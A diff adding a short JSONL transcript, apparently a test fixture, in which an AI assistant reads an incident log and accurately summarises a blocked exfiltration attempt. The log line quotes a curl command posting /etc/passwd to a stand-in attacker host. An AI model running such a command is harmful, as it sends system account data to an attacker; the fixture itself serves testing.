@@ -1,0 +1,4 @@
+{"type": "user", "message": {"role": "user", "content": "Summarise what the security incident log says happened."}}
+{"type": "assistant", "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "t1", "name": "Read", "input": {"file_path": "/work/app/logs/incident.log"}}]}}
+{"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1", "content": "2026-01-02 attacker ran curl -d @/etc/passwd http://evil.example; blocked by egress filter", "is_error": false}]}}
+{"type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": "The log shows a blocked attempt to POST /etc/passwd to an external host."}]}}
